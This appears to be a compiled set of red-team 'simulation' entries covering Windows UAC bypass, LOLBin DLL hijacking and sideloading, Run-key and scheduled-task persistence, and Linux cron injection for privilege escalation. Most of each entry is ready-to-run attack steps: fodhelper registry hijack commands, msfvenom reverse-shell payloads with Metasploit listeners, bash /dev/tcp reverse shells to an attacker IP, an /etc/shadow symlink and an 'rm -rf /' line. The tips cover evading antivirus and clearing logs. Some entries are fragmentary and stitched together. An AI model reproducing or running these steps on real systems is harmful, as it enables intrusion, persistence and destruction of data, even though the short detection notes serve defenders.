- **Scenario**: This simulation showcases how an attacker can exploit Windows AutoElevated binaries—trusted applications with auto-admin elevation—to bypass User Account Control (UAC) and gain elevated privileges without a UAC prompt. These apps are signed by Microsoft, auto-elevated via the autoElevate=true manifest, and exploitable when combined with techniques like DLL hijacking, environment variable abuse, or token manipulation.
- **Attack Steps**: ### 🟢 STEP 1: Setup the Target System• Use Windows 10/11 VM• Log in with a low-privileged user account• Confirm UAC is enabled (default setting)• Confirm user is in local Administrators group (needed for UAC bypass to work)---### 🟢 STEP 2: Identify AutoElevated Apps• Check known apps with autoElevate flag:→ fodhelper.exe, eventvwr.exe, sdclt.exe, compmgmtlauncher.exe, etc.Run:icacls C:\Windows\System32\fodhelper.exeCheck digital signature: right-click → Properties → Digital Signatures---### 🟢 STEP 3: UAC Bypass via Registry HijackSome autoElevated apps load values from the registry that are user-writableExample for fodhelper.exe:1. Open PowerShell:powershell<br>New-Item "HKCU:\Software\Classes\ms-settings\shell\open\command" -Force<br>New-ItemProperty "HKCU:\Software\Classes\ms-settings\shell\open\command" -Name "DelegateExecute" -Value "" -Force<br>Set-ItemProperty "HKCU:\Software\Classes\ms-settings\shell\open\command" -Name "(default)" -Value "powershell.exe -Command Start-Process cmd -Verb runAs"<br>Start-Process "C:\Windows\System32\fodhelper.exe"<br>✅ This will open a SYSTEM-level cmd.exe without triggering UAC---### 🟢 STEP 4: Validate Privilege Escalation• In elevated CMD, run:whoami /groups✅ Output: S-1-16-12288 → High Mandatory Level (admin)---### 🟢 STEP 5: Cleanup Registrypowershell<br>Remove-Item "HKCU:\Software\Classes\ms-settings" -Recurse -Force<br>---### 🟢 STEP 6: (Optional) Use Other AutoElevated Apps• eventvwr.exe can be abused by hijacking HKCU\Software\Classes\mscfile\shell\open\command• sdclt.exe can be abused with environment variable manipulation🧠 Tips:• These techniques require user to be part of Administrators group• No exploit works if user is not in admin group or UAC is set to “Always Notify”• Detection relies on behavioral logging, not just binaries used
- **Detection**: - Sysmon + Event ID 1/13/4688 for process tree anomalies- Registry key audit on HKCU:\Software\Classes\*- Detect unusual spawning of fodhelper.exe or sdclt.exe
- **Solution**: - Harden UAC settings (set to "Always Notify")- Remove unneeded users from Administrators group- Monitor and alert on use of autoElevated binaries- Block or restrict legacy apps (AppLocker/WDAC)
- **Tags**: #UACBypass #AutoElevate #fodhelperExploit #WindowsEscalation #LocalPrivEsc #RedTeamToolkit #RegistryHijack #EthicalHacking

## Signed Binary Proxy Execution (LOLBin DLL Hijacking)

- **Attack Type**: Local Privilege Escalation / Defense Evasion via LOLBin
- **Target**: Signed Microsoft executablesWhitelisted environmentsEnterprise desktops with AppLocker
- **Vulnerability**: Signed binary proxy executionDLL load order hijackingUnsigned DLLs loaded by signed executables
- **MITRE**: T1218.011 (Signed Binary Proxy Execution: Rundll32)T1574.001 (Hijack Execution Flow: DLL Search Order Hijacking)
- **Impact**: - Code execution without dropping EXEs- Bypass application whitelisting- Stealthy persistence / post-exploitation
- **Tools**: ✅ Windows 10/11 VM (Target)✅ PowerShell✅ Process Monitor✅ Sysinternals Suite✅ Kali Linux✅ msfvenom, sigcheck
- **Scenario**: This simulation demonstrates how attackers can abuse signed Windows binaries (called LOLBins) to load malicious DLLs using trusted Microsoft-signed executables. Since these binaries are signed and whitelisted (e.g., by AppLocker), hijacking their DLL load path lets attackers bypass application whitelisting, UAC, or antivirus, resulting in stealthy privilege escalation or code execution.
- **Attack Steps**: ### 🟢 STEP 1: Prepare Target and Attacker• Use a Windows VM (target)• Attacker uses Kali or another Win VM---### 🟢 STEP 2: Identify LOLBin CandidatesLook for signed Microsoft binaries that load DLLs from their own directory first.✅ Common LOLBins:• SyncAppvPublishingServer.vbs• PresentationHost.exe• InstallUtil.exe• MSBuild.exeCheck official LOLBAS list: https://lolbas-project.github.io---### 🟢 STEP 3: Monitor DLL Load Behavior1. Run the binary inside Process Monitor2. Set filters:• Operation → Load Image• Path → contains .dllObserve:✅ If binary attempts to load a DLL from its own folder that doesn’t exist → DLL hijackableExample:PresentationHost.exe looks for mscoree.dll in its folder---### 🟢 STEP 4: Craft Malicious DLLFrom attacker VM, create DLL with reverse shell:bash<br>msfvenom -p windows/x64/meterpreter/reverse_tcp LHOST=<attacker_IP> LPORT=4444 -f dll > Evil.dll<br>Rename DLL to the missing one (mscoree.dll, etc.)---### 🟢 STEP 5: Setup Attacker ListenerIn Kali:msfconsoleuse exploit/multi/handlerSet payload: windows/x64/meterpreter/reverse_tcpSet LHOST, LPORTrun---### 🟢 STEP 6: Hijack Execution1. Copy PresentationHost.exe and Evil.dll to a folder writable by user2. Run:cmd<br>C:\Users\user\Downloads\PresentationHost.exe<br>✅ The signed binary loads attacker’s DLL = reverse shell opens as current user---### 🟢 STEP 7: Privilege Escalation VariantIf used with auto-elevated LOLBins (e.g., fodhelper.exe, ComputerDefaults.exe) and registry hijack → gain SYSTEM---### 🛑 STEP 8: Cleanup• Remove Evil.dll, logs, and binaries• Restore original files if copied from System32🧠 Tips:• Combine with InstallUtil.exe to bypass AppLocker• Avoid AV triggers by modifying DLL signature• LOLBin bypass works even on locked-down environments
- **Detection**: - Monitor LOLBin usage (e.g., MSBuild.exe, InstallUtil.exe)- Use Event ID 7 (AppLocker), 4688 (new process), 11 (Sysmon DLL load)- Detect unsigned DLLs in LOLBin directories
- **Solution**: - Block or restrict access to known LOLBins (via WDAC/AppLocker)- Enforce DLL signature validation- Disable unnecessary Windows features- Use EDR with behavioral analysis
- **Tags**: #LOLBin #DLLHijack #SignedBinaryAbuse #ProxyExecution #RedTeam #SysmonDetection #BypassAppLocker #StealthExecution

## DLL Sideloading (Trusted App Loads Untrusted DLL)

- **Attack Type**: Local Privilege Escalation / Evasion via Sideload
- **Target**: Signed applicationsAuto-launched EXEsTrusted software with missing DLLs
- **Vulnerability**: Application loads unsigned DLLs from current or writable directoryWindows DLL search order is vulnerable
- **MITRE**: T1574.002 (Hijack Execution Flow: DLL Side-Loading)T1218.011 (Signed Binary Proxy Execution)
- **Impact**: - Code execution under trusted binary context- AppLocker & AV bypass- Stealthy post-exploitation technique
- **Tools**: ✅ Windows 10/11 VM (Target)✅ Kali Linux or Attacker VM✅ Process Monitor, Sigcheck, msfvenom, x64dbg✅ Legit signed EXE (e.g., vlc.exe, GoogleUpdate.exe, enterprise installers)
- **Scenario**: This simulation explores DLL sideloading, where a legitimate signed application is tricked into loading a malicious DLL placed in its working directory. This method abuses Windows DLL load order and is useful for executing arbitrary code, bypassing AppLocker, and evading AVs, especially in environments that trust signed apps but don't verify DLL sources or digital signatures.
- **Attack Steps**: ### 🟢 STEP 1: Setup Target• Use Windows VM (non-admin user)• Copy a trusted app (e.g., vlc.exe) to a temp directory like C:\Users\user\Downloads\AppTest• Ensure user can write in folder---### 🟢 STEP 2: Identify DLLs the EXE Tries to LoadUse Process Monitor:• Filter by Process Name = vlc.exe• Observe operations → Load Image or CreateFile• Look for NAME NOT FOUND on DLLs (e.g., libvlc.dll, msvcp140.dll)✅ This shows which DLLs the app tries to load from the working directory---### 🟢 STEP 3: Create Malicious DLLFrom Kali or Metasploit:bash<br>msfvenom -p windows/x64/meterpreter/reverse_tcp LHOST=<your_IP> LPORT=4444 -f dll > msvcp140.dll<br>Rename the DLL to match missing one (libvlc.dll, etc.)---### 🟢 STEP 4: Place and Execute1. Place both vlc.exe and msvcp140.dll into same folder:text<br>C:\Users\user\Downloads\AppTest\<br> ├── vlc.exe<br> └── msvcp140.dll ← attacker-controlled<br>2. Launch vlc.exe normally:cmd<br>cd C:\Users\user\Downloads\AppTest<br>vlc.exe<br>✅ Payload (DLL) runs under the trust of the signed application, often bypassing AV---### 🟢 STEP 5: Privilege Escalation (if app runs elevated)• If the trusted EXE is run as SYSTEM or Admin (e.g., via service or startup), then attacker gains elevated shell---### 🛑 STEP 6: Cleanup• Remove DLL• Wipe event logs or restore state if for training🧠 Tips:• Use software installers or tools that don’t verify DLL signature• Signed apps + unsigned DLL = signature bypass• Combine with persistence (e.g., Task Scheduler + DLL sideload)
- **Detection**: - Monitor unusual DLL loads (Sysmon Event ID 7)- Track unsigned DLLs loaded by signed EXEs- Watch high-privilege EXEs running from temp/user paths
- **Solution**: - Use Code Integrity Policies (WDAC)- Ensure DLLs are signed or validated- Restrict user write permissions in sensitive paths- Monitor behavior with EDR/XDR
- **Tags**: #DLLSideloading #SideLoading #AppLockerBypass #SignedBinaryAbuse #RedTeamTTPs #Persistence #StealthExecution #DLLHijack

## Persistence via Run Key + DLL Proxy

- **Attack Type**: Persistence + Stealthy Code Execution via Registry Key
- **Target**: WorkstationsWindows laptopsPrivileged user accountsDomain-joined or standalone endpoints
- **Vulnerability**: Unprotected registry key allows persistence via HKCU\...\RunTrusted binary loads malicious DLL
- **MITRE**: T1547.001 (Registry Run Keys for Startup)T1574.002 (DLL Sideloading)T1055 (Process Injection – if used with shell injection)
- **Impact**: - Persistent access- Code execution at every login- Bypass of AV or EDR alerts if proxy is trusted- Long-term stealthy backdoor
- **Tools**: ✅ Windows 10/11 VM✅ Registry Editor✅ reg command✅ Process Monitor✅ msfvenom✅ Sysinternals Suite✅ Any proxy EXE (e.g., rundll32.exe, cleanmgr.exe, wscript.exe)
- **Scenario**: This simulation explores how attackers maintain persistence on a Windows system by creating a Run registry key that points to a signed or benign executable, which in turn loads a malicious DLL. The method uses trusted proxy binaries to avoid detection, while the payload DLL handles actual malicious code (e.g., reverse shell, privilege escalation, keylogger).
- **Attack Steps**: ### 🟢 STEP 1: Setup Target VMUse Windows 10/11 VM (non-admin or admin)Ensure user has registry write access---### 🟢 STEP 2: Identify Suitable Proxy BinaryPick a signed Windows binary that loads a DLL or script, e.g.:• rundll32.exe• cleanmgr.exe• wscript.exePlace this EXE + a malicious DLL in the same folder (e.g., C:\Users\user\AppData\Roaming\Backup\)---### 🟢 STEP 3: Craft Malicious DLLOn Kali:bash<br>msfvenom -p windows/x64/meterpreter/reverse_tcp LHOST=<your_IP> LPORT=4444 -f dll > evil.dll<br>Rename to expected name (e.g., backup.dll)---### 🟢 STEP 4: Create Run Registry KeyCommand:powershell<br>reg add "HKCU\Software\Microsoft\Windows\CurrentVersion\Run" /v BackupService /t REG_SZ /d "C:\Users\user\AppData\Roaming\Backup\cleanmgr.exe"<br>✅ Now on every reboot/login, cleanmgr.exe will launch, loading the attacker’s DLL---### 🟢 STEP 5: Start Listener and RebootOn Kali:bash<br>msfconsole<br>use exploit/multi/handler<br>set payload windows/x64/meterpreter/reverse_tcp<br>set LHOST <your_IP><br>set LPORT 4444<br>run<br>Reboot or log off/on in Windows → DLL is executed stealthily---### 🛑 STEP 6: Cleanup• Remove registry key:reg delete "HKCU\...\Run" /v BackupService /f• Delete payload files from disk• Clear event logs if required for test🧠 Tips:• Pair with DLL sideloading or LOLBins• Evades detection if using Microsoft-signed EXE• Works in user context unless elevated binary is used
- **Detection**: - Monitor registry for changes (Sysmon Event ID 13)- Detect EXEs in unusual paths- Analyze DLL loads from startup apps- Look for unsigned DLLs loaded by trusted EXEs
- **Solution**: - Disable write permissions to Run key via GPO- Monitor and block untrusted paths- Enforce digital signature validation- Use EDR with behavior analysis- Remove unapproved startup entries regularly
- **Tags**: #Persistence #RegistryRun #DLLProxy #RedTeam #DLLHijack #BypassAppLocker #Stealth #StartupPersistence

- **Scenario**: This simulation shows how an attacker can create a malicious scheduled task to persist access or escalate privileges. The task can be triggered on boot, logon, or on a timer, running a payload such as a reverse shell, malicious script, or proxy DLL. Used in malware, APTs, and red team toolkits to maintain presence even after reboot or logout.
- **Attack Steps**: ### 🟢 STEP 1: Create Payload (DLL or EXE)Use Kali or Metasploit to generate a payload:bash<br>msfvenom -p windows/x64/meterpreter/reverse_tcp LHOST=<your_IP> LPORT=4444 -f exe > shell.exe<br>Transfer to victim’s machine:• Place in C:\Users\Public\shell.exe---### 🟢 STEP 2: Create Scheduled Task (Manual – CMD)From low-priv or admin shell:cmd<br>schtasks /create /tn "WindowsUpdateChecker" /tr "C:\Users\Public\shell.exe" /sc onlogon /rl highest /f<br>• /tn → Task name• /tr → Path to payload• /sc → Schedule (e.g., onlogon, daily, hourly)• /rl highest → Run with highest privileges✅ This task now runs on every user logon, even after reboot---### 🟢 STEP 3: Start Listener on Attacker Sidebash<br>msfconsole<br>use exploit/multi/handler<br>set payload windows/x64/meterpreter/reverse_tcp<br>set LHOST <your_IP><br>set LPORT 4444<br>run<br>---### 🟢 STEP 4: Reboot / Re-loginWhen the user logs in, the task triggers, and you get a reverse shell back on your Kali listener.---### 🛑 STEP 5: Cleanup (Post-Lab)• Remove task:schtasks /delete /tn "WindowsUpdateChecker" /f• Delete payload EXE• Clear logs (for lab cleanup only)🧠 Tips:• Works well for stealth persistence if payload is obfuscated• Can be used with signed proxy EXE (e.g., wscript.exe script.js)• Can also schedule DLL using rundll32 if desired• Good combination with time-based triggers for evasion
- **Detection**: - Monitor new scheduled tasks (Event ID 4698)- Use Autoruns to audit scheduled jobs- Look for unknown payloads in \Tasks\ or %Public% folders- Use EDR rules for schtasks.exe abuse

- **Detection**: - Use accesschk to audit tasks and their linked files- Monitor task folders and contents for changes- Event ID 4698, 4700 (task mod), and 4688 (process creation)
- **Solution**: - Apply strict ACLs on all task-linked files/scripts- Avoid referencing files in writable paths- Use Code Integrity / AppLocker- Regularly audit task configuration

- **Vulnerability**: Schedule.Service COM object lacks sufficient telemetryAV/EDR may not detect PowerShell COM usage
- **MITRE**: T1053.005 (Scheduled Task via COM API)
- **Impact**: - Covert task creation- Evade schtasks command-line monitoring- Persist after reboot
- **Tools**: ✅ Windows 10/11✅ PowerShell✅ JScript or VBScript✅ Visual Studio Code / Notepad✅ Meterpreter or msfvenom payload✅ Sysinternals Autoruns (for detection)✅ Procmon (to monitor COM interactions)
- **Scenario**: This simulation shows how an attacker can abuse the Task Scheduler COM interface (via Schedule.Service) to programmatically create or modify scheduled tasks, bypassing command-line logging or EDR detection. It allows stealthy creation of persistent or privilege-escalated tasks using Windows scripting (PowerShell or JScript) without using schtasks.exe or visible shell commands.
- **Attack Steps**: ### 🟢 STEP 1: Craft the Malicious PayloadGenerate reverse shell:msfvenom -p windows/x64/shell_reverse_tcp LHOST=<attacker_IP> LPORT=4444 -f exe -o backdoor.exeMove to: C:\Users\Public\backdoor.exe---### 🟢 STEP 2: Create Task via COM (PowerShell)In PowerShell ISE:$service = New-Object -ComObject Schedule.Service$service.Connect()$rootFolder = $service.GetFolder("\\")$taskDefinition = $service.NewTask(0)$trigger = $taskDefinition.Triggers.Create(1) # AtLogon$action = $taskDefinition.Actions.Create(0)$action.Path = "C:\\Users\\Public\\backdoor.exe"$taskDefinition.Settings.Enabled = $true$taskDefinition.RegistrationInfo.Description = "Windows Helper Service"$rootFolder.RegisterTaskDefinition("WinHelper", $taskDefinition, 6, "", "", 3)✅ A hidden task will now launch your backdoor on user logon---### 🟢 STEP 3: Listen for ShellOn attacker machine:nc -nlvp 4444Wait for victim login and connection---### 🔚 STEP 4: CleanupRemove task:$rootFolder.DeleteTask("WinHelper", 0)Delete payload:Remove-Item C:\Users\Public\backdoor.exe---🧠 Tips:• This does not leave schtasks.exe trace• Can be combined with DLL sideloading• Use in combination with AMSI bypass for stealth
- **Detection**: - Monitor PowerShell event logs (4104, 4688)- Use Sysmon for COM object instantiation- Watch for suspicious task descriptions
- **Solution**: - Limit script-based COM creation- Enable script block logging- Use AppLocker to block PowerShell COM misuse
- **Tags**: #COMHijack #TaskSchedulerAbuse #Persistence #RedTeamTactics #PowerShellCOM #WindowsExploit

## Bypass UAC via Scheduled Task

- **Attack Type**: UAC Bypass via Auto-elevated Task Abuse
- **Target**: Windows WorkstationsDomain-joined SystemsDeveloper or Admin Machines
- **Vulnerability**: Auto-elevated scheduled task without secure action pathWritable path or arguments
- **MITRE**: T1548.002 (Abuse Elevation Control Mechanism: Bypass UAC)
- **Impact**: - Full local privilege escalation- UAC bypass with no popup- Attacker gains SYSTEM/Administrator context
- **Tools**: ✅ Windows 10/11 (target)✅ schtasks.exe✅ PowerShell✅ Process Hacker or Task Scheduler GUI✅ Sysinternals (AccessChk)✅ UACME or custom payload binary
- **Scenario**: This simulation shows how an attacker can bypass UAC (User Account Control) by leveraging auto-elevated scheduled tasks that already run with high integrity level. Many system-defined tasks in C:\Windows\System32\Tasks can be hijacked if permissions are misconfigured or if they're auto-elevated without a consent prompt. The attacker creates/modifies a scheduled task or executes one via command line or COM API to elevate privileges without triggering a UAC prompt.
- **Attack Steps**: ### 🟢 STEP 1: Check System for UAC SettingsRun:reg query HKLM\SOFTWARE\Microsoft\Windows\CurrentVersion\Policies\System /v ConsentPromptBehaviorAdmin• If result = 2, UAC is at “Prompt for consent” — bypass is needed.---### 🟢 STEP 2: Identify Auto-Elevated Scheduled TasksRun:schtasks /query /fo LIST /v > tasks.txtLook for tasks with “Run with highest privileges: Yes”Example: SilentCleanup, ScheduledDefrag, SilentInstaller, etc.---### 🟢 STEP 3: Check for Modifiable Task Folders or ScriptsUse Sysinternals AccessChk:accesschk.exe -uwdqs "C:\Windows\System32\Tasks"Or manually browse: C:\Windows\System32\Tasks\<TaskName>Look for weak permissions or writable action paths (like C:\Users\Public\cleanup.bat)---### 🟢 STEP 4: Craft Malicious PayloadUse msfvenom or a simple reverse shell:msfvenom -p windows/x64/shell_reverse_tcp LHOST=<attackerIP> LPORT=4444 -f exe > uac_bypass_payload.exe---### 🟢 STEP 5: Replace Task Script / Command PathIf the task launches a script, replace the script contents:echo start uac_bypass_payload.exe > C:\Users\Public\cleanup.batOr update task command via:schtasks /change /tn "\SilentCleanup" /tr "C:\Users\Public\uac_bypass_payload.exe"---### 🟢 STEP 6: Trigger Task Without UAC PromptRun:schtasks /run /tn "\SilentCleanup"Payload runs with elevated privileges, no UAC popup shown.---### 🟢 STEP 7: Confirm Shell and CleanupCatch shell on attacker listener:nc -nlvp 4444Delete payload:del C:\Users\Public\uac_bypass_payload.exeRestore original task settings if needed.✅ UAC Bypassed via trusted auto-elevated task.
- **Detection**: - Monitor usage of schtasks.exe or COM Scheduler API- Enable logging for task registration and execution (Event ID 4698, 4700)- Detect unsigned payloads executed by system tasks
- **Solution**: - Set UAC to “Always Notify” (value 2)- Avoid using scheduled tasks with “Run with highest privileges” for user-controlled tasks- Use AppLocker / Defender Application Control- Harden permissions on all task files and actions
- **Tags**: #BypassUAC #PrivEsc #WindowsTasks #Persistence #RedTeam #ScheduledTasks #TaskHijack #OSExploit #UAC

## Cron Job Injection

- **Attack Type**: Local Privilege Escalation via Scheduled Tasks
- **Target**: Linux serversOn-prem or cloud VMsDeveloper / shared Linux environments
- **Vulnerability**: Writable cron files or scriptsMisconfigured file permissionsImproper validation of scheduled tasks

- **Impact**: - Attacker escalates to root- Can maintain persistence- Potential lateral movement or full takeover
- **Tools**: ✅ Kali Linux (attacker)✅ Target Linux system (Ubuntu/Debian)✅ crontab, find, grep, nano, netcat✅ Reverse shell payload✅ pspy (optional for cron debugging)
- **Scenario**: This simulation demonstrates how an attacker with limited access on a Linux machine can escalate privileges by injecting a malicious command into a world-writable cron file, abusing misconfigured cron jobs, or placing a malicious script in directories executed by root-owned cron tasks. This is a common privilege escalation technique when Linux administrators use poor permission policies or leave writable cron paths exposed.
- **Attack Steps**: ### 🟢 STEP 1: Identify Writable Cron Files or DirectoriesRun:find /etc/cron* -type f -writable 2>/dev/nullls -l /etc/crontabls -l /etc/cron.d/Check permissions like:-rw-rw-r-- or -rwxrwxrwxThese are vulnerable if writable by non-root users.---### 🟢 STEP 2: Identify Target Execution TimingEdit or observe /etc/crontab or scripts in /etc/cron.hourly, /etc/cron.dailyExample vulnerable entry:* * * * * root /usr/local/bin/backup.shCheck if /usr/local/bin/backup.sh is writable:ls -l /usr/local/bin/backup.sh---### 🟢 STEP 3: Inject Malicious PayloadEdit writable file:nano /usr/local/bin/backup.shAdd:bash -i >& /dev/tcp/<attacker-IP>/4444 0>&1Save and exit.Or if /etc/crontab itself is writable:Add entry:* * * * * root bash -i >& /dev/tcp/<attacker-IP>/4444 0>&1---### 🟢 STEP 4: Setup Reverse Shell ListenerOn attacker machine:nc -nlvp 4444Wait for next scheduled cron run (~60s)---### 🟢 STEP 5: Gain Root ShellOnce cron executes the injected job, reverse shell spawnsAttacker now has root shell---### 🛑 STEP 6: CleanupRemove injected cron entry or script modification:nano /etc/crontab → remove linerm /usr/local/bin/backup.sh (if created)✅ Privilege escalation achieved via cron job injection.
- **Detection**: - Monitor changes in /etc/cron*- Audit file permissions- Use auditd or pspy to detect unauthorized cron executions
- **Solution**: - Set strict permissions on all cron files and scripts- Use chown root:root and chmod 600 for cron tasks- Monitor cron job execution with logging and alerting
- **Tags**: #CronInjection #LinuxPrivEsc #CronHack #OSExploits #ScheduledTask #RedTeamTTPs #PrivilegeEscalation #WritableCron

## Inject Payload into Writable Cron Script

- **Attack Type**: Local Privilege Escalation via Cron Script Injection
- **Target**: Linux systemsCloud VMsDeveloper workstationsInternal servers
- **Vulnerability**: Root-owned script is writable by low-privileged user and executed on schedule
- **MITRE**: T1053.003 (Scheduled Task/Job: Cron)
- **Impact**: - Root-level code execution- Shell access- Full host compromise- Optional persistence mechanism
- **Tools**: ✅ Kali Linux (Attacker)✅ Target Linux machine (e.g., Ubuntu VM)✅ find, nano, bash, netcat, whoami, ls✅ (Optional) pspy to monitor cron execution
- **Scenario**: This scenario demonstrates how an attacker with low privileges can gain root access by modifying a writable cron-executed script. If a script executed by root via cron is found to be writable by any user, an attacker can append malicious commands to it (e.g., reverse shell), and gain elevated privileges once the cron job runs. This is a common misconfiguration in Linux systems where automation scripts are not properly protected.
- **Attack Steps**: ### 🟢 STEP 1: Locate Writable Cron-Executed ScriptCheck for writable files executed by cron:find /etc/cron* -type f -writable 2>/dev/nullCommon paths:/etc/cron.daily/, /etc/cron.hourly/, /etc/cron.d/Example vulnerable script:/etc/cron.hourly/system_backup.sh---### 🟢 STEP 2: Verify File Ownership and Permissionsls -l /etc/cron.hourly/system_backup.shOutput:-rwxrwxrwx 1 root root 123 Jul 7 07:00 system_backup.sh✅ Writable by any user = vulnerable---### 🟢 STEP 3: Inject Malicious PayloadEdit the script:nano /etc/cron.hourly/system_backup.shAppend this reverse shell payload:bash -i >& /dev/tcp/<attacker-IP>/4444 0>&1Save and exit the file.---### 🟢 STEP 4: Start Reverse Shell ListenerOn attacker machine:nc -nlvp 4444Wait for next cron execution (~60s)---### 🟢 STEP 5: Catch the Root ShellIf successful, a root reverse shell appears:whoami → output: rootAttacker now has full control---### 🛑 STEP 6: Cleanup (Ethical Practice)Remove injected line:nano /etc/cron.hourly/system_backup.shDelete malicious codeLog off reverse shell:exit✅ Exploit complete
- **Detection**: - Monitor cron execution and file changes- Use auditd, inotify, pspy- Watch for cron-based reverse shell behavior in logs
- **Solution**: - Set strict file permissions:chmod 700 and chown root:root for root scripts- Avoid world-writable cron scripts- Centralize script management and auditing
- **Tags**: #LinuxCron #CronScriptHack #PrivEsc #ReverseShell #WritableScript #RedTeam #T1053 #BashExploit #OSExploit

## Writable Cron File (Root’s Crontab)

- **Attack Type**: Local Privilege Escalation via Crontab Injection
- **Target**: Linux serversDeveloper machinesCloud containersMisconfigured VMs
- **Vulnerability**: Crontab file owned by root is world/group-writable or misconfigured
- **MITRE**: T1053.003 (Scheduled Task/Job: Cron)
- **Impact**: - Attacker gains persistent root shell- Can run arbitrary code as root every minute- Privilege escalation

If any cron job configuration file (e.g., /var/spool/cron/root or /etc/crontab) is writable by a non-root user, attackers can inject malicious commands or payloads. The cron daemon will execute them as root, giving the attacker elevated privileges or persistence.
- **Attack Steps**: ### 🟢 STEP 1: Identify Writable Root CrontabRun:find / -name 'root' -writable 2>/dev/nullorls -la /var/spool/cron/Look for:-rw-rw-rw- 1 root root 512 Jul 7 09:10 root✅ If writable by user/group/others → Vulnerable---### 🟢 STEP 2: Inject Malicious Cron EntryOpen the crontab file:nano /var/spool/cron/rootAdd this line at the bottom:* * * * * bash -i >& /dev/tcp/<attacker-ip>/4444 0>&1✅ This will attempt a reverse shell every minute---### 🟢 STEP 3: Start Listener on Attacker Machinenc -nlvp 4444Wait for connection---### 🟢 STEP 4: Confirm Root AccessOnce shell connects:whoami → should return rootid → confirms UID 0---### 🛑 STEP 5: Cleanup After TestingRemove malicious line from root’s crontab:nano /var/spool/cron/rootDelete injected lineRestart cron service if needed:systemctl restart cron✅ Ethical simulation complete
- **Detection**: - Monitor crontab entries- Use auditd or inotify to track changes to /var/spool/cron/root- Monitor for reverse shell behavior in logs
- **Solution**: - Set proper permissions: chmod 600- Only root should own and write cron files- Monitor cron directories regularly- Use file integrity monitoring (FIM)

- **Tools**: ✅ Kali Linux✅ Target Linux (Ubuntu or Debian)✅ crontab, nano, whoami, id, echo, chmod, mkdir
- **Scenario**: Many cron jobs use environment variables (e.g., PATH, SHELL, MAILTO) at the top of the crontab. If an attacker can edit a user's crontab (or trick the system into running it), they can set a malicious environment variable (like PATH) to point to a directory with a malicious binary, tricking the cron job to run their payload as root or a privileged user.
- **Attack Steps**: ### 🟢 STEP 1: Set Up EnvironmentCreate a malicious binary:mkdir /tmp/fakebin && echo -e '#!/bin/bash\necho hacked > /tmp/pwned' > /tmp/fakebin/ls && chmod +x /tmp/fakebin/ls---### 🟢 STEP 2: Edit Crontabcrontab -eSet a malicious PATH:PATH=/tmp/fakebin:/usr/local/sbin:/usr/local/bin:/usr/sbin:/usr/bin:/sbin:/binAdd a cron job:* * * * * ls---### 🟢 STEP 3: Wait One MinuteCheck:cat /tmp/pwned → should print hacked---✅ This proves the cron used your fake binary instead of system one---### 🛑 STEP 4: CleanupRemove crontab entry:crontab -e and delete linesDelete files:rm -rf /tmp/fakebin /tmp/pwned

## Hijack Log or Temp File Referenced by Cron Script

- **Attack Type**: Privilege Escalation via File Hijacking
- **Target**: Linux (Ubuntu/Debian)macOS (with cron)
- **Vulnerability**: Writable log or temp file used in root-owned cron job
- **MITRE**: T1053.003 (Scheduled Task/Job: Cron)
- **Impact**: - File overwrite as root- Full privilege escalation- Shadow file deletion or replacement
- **Tools**: ✅ Kali Linux (attacker)✅ Ubuntu/Parrot (target VM)✅ crontab command✅ ln, ls, chmod, nano, tail, whoami
- **Scenario**: In this scenario, a cron job run as root references a temporary file or log file (e.g., /tmp/task.log) that is world-writable or improperly permissioned. An attacker can replace or symlink the file to a malicious script or system file (like /etc/shadow). On next cron run, the root process overwrites it or executes unintended code, leading to privilege escalation or data corruption.
- **Attack Steps**: ### 🟢 STEP 1: Identify Vulnerable Cron JobCheck root’s cron jobs:sudo cat /etc/crontab or sudo crontab -lExample vulnerable entry:* * * * * root /usr/local/bin/backup.sh >> /tmp/backup.logThis script writes to a world-accessible /tmp/backup.log.---### 🟢 STEP 2: Hijack the Log FileReplace /tmp/backup.log with a symlink to a critical file:ln -s /etc/shadow /tmp/backup.logORInject a malicious command:echo 'rm -rf /' > /tmp/backup.log---### 🟢 STEP 3: Wait for Cron to TriggerWait 1–2 minutes for cron to execute. When backup.sh writes output to the log, it now overwrites /etc/shadow (denial) or triggers the payload.---### 🟢 STEP 4: Gain Privilege or Cause ImpactIf malicious code was placed, observe system behavior:whoami → now root?tail -f /etc/shadow → corrupted or empty?---### 🟢 STEP 5: Cleanup for Safety• Remove malicious links or files• Restore original cron behavior• Fix permissions on scripts and files• Document findings and submit to blue team✅ Tip: Use auditctl -w /tmp/backup.log -p wa to monitor file changes.
- **Detection**: - Monitor cron job output- Use auditd or Sysmon for Linux- Detect symlink to protected files
- **Solution**: - Use mktemp with safe perms- Never write to world-writable paths- Validate log file paths- Use logrotate with correct perms
- **Tags**: #CronExploit #TempHijack #LinuxPrivEsc #WritableLog #RootBypass #ScheduledTaskAbuse #CronMisconfig

## Abuse World-Writable /etc/cron.d/

- **Attack Type**: Privilege Escalation / Persistence via Cron
- **Target**: Linux ServersCloud VMsContainers

- **Scenario**: If the directory /etc/cron.d/ is world-writable (chmod 777 or chmod o+w), attackers can place malicious job files that the cron daemon executes with root privileges. This attack exploits misconfigured file permissions, common in poorly hardened Linux systems, allowing any local user to escalate privileges or maintain stealthy persistence using native system cron features.
- **Attack Steps**: ### 🟢 STEP 1: Verify World-Writable PermissionsCheck the directory:ls -ld /etc/cron.d/If output shows drwxrwxrwx or similar (rwx for others), it's misconfigured.---### 🟢 STEP 2: Prepare Malicious Cron FileCreate a cron job that runs every minute with root privileges:Example reverse shell job:bash<br>echo '* * * * * root bash -i >& /dev/tcp/<attacker-IP>/4444 0>&1' > evilcron<br>Alternative: Use a local shellbash<br>echo '* * * * * root /bin/bash /tmp/rootme.sh' > evilcron<br>Make sure the script /tmp/rootme.sh is executable and does something verifiable (like creating a root-owned file or adding a new root user).---### 🟢 STEP 3: Deploy Cron FilePlace it in /etc/cron.d/:mv evilcron /etc/cron.d/evilcronSet correct permissions:chmod 644 /etc/cron.d/evilcron(Cron requires readable files, not executable.)---### 🟢 STEP 4: Start Listener (If Reverse Shell Used)On attacker box:nc -nlvp 4444Wait for cron to run (within 60 seconds). Shell should connect.---### 🟢 STEP 5: Validate Exploitation• If reverse shell: check access level → id → should be uid=0 (root)• If using a script:tail -f /tmp/root_flag.txt or check /etc/passwd for new root user---### 🟢 STEP 6: Cleanup (For Ethical Testing Only)• Remove cron file:rm /etc/cron.d/evilcron• Remove temp files or root user if added• Document timestamps and test results for analysis✅ Tip: Use isolated VMs and snapshots during practice labs. Never test on production Linux systems.
- **Detection**: - Monitor file integrity of /etc/cron.d/- Use auditd to track file writes- Alert on new files owned by non-root users
- **Solution**: - Restrict write permissions to /etc/cron.d/- Run chmod o-w /etc/cron.d- Implement tripwire, aide, or similar integrity checkers- Use AppArmor/SELinux to limit cron jobs
